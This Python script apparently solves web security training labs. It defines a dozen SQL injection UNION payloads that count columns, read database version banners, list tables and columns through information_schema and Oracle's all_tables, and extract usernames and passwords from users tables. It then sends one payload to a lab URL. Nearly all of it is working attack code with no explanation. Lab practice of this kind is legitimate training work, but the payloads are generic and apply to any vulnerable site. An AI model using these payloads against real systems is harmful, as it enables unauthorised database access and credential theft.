#!/usr/bin/python3
import requests as req
import urllib 


def getrequest(url):
    return req.get(url).text

def postrequest(url,data):
    return req.post(url=url,data=data)

def urlencode(url):
    return urllib.parse.quote(url)

def main():
    ## Concat data from other table
    payload =  "'UNION SELECT NULL,'username: ' || username || ' password: ' || password from users--"
    ## Discovering Number of columns from the first table that is displaying the query
    payload2 = "'UNION SELECT NULL,NULL,NULL --"
    ## Discovering Which columns are String type
    payload3 = "'UNION SELECT NULL,NULL,'a' --"
    ##ORACLE Databases UNION Attack
    payload4 = "'UNION SELECT NULL,NULL from DUAL--"
    payload5 = "'UNION SELECT banner,NULL from v$version--"
    ##Microsoft and Mysql Databases UNION Attack (note the space at the end) Also works with "# "
    payload6 = "'UNION SELECT @@version,'DATABASE VERSION '-- "
    ## URL ENCODE
    payload6 = urlencode(payload6)
    ## Getting table_names information schema (NOT ORACLE)
    payload7 = "'UNION SELECT TABLE_NAME,TABLE_TYPE FROM information_schema.tables where TABLE_TYPE='BASE TABLE' --"
    ## Getting column name from table name
    payload8 = "'UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_qkwkhh'--"
    payload8 = urlencode(payload8)
    payload9 = "'UNION SELECT username_qofauw,password_lhaald FROM users_qkwkhh--"

    ## Getting Table names Oracle
    payload10 = "'UNION SELECT TABLESPACE_NAME,TABLE_NAME FROM all_tables--"
    ## Getting Column names from Table_name
    payload11 = "'UNION SELECT COLUMN_NAME,DATA_TYPE FROM all_tab_columns WHERE table_name = 'USERS_AONXDE' --"

    payload12 = "'UNION SELECT USERNAME_KVSTOY,PASSWORD_TMUDBY FROM USERS_AONXDE -- "
    
    url = "https://ac281f891e099e20808a0608003a0004.web-security-academy.net/filter?category=Lifestyle"
    print(getrequest(url+payload12))

if __name__ == '__main__':
    main()
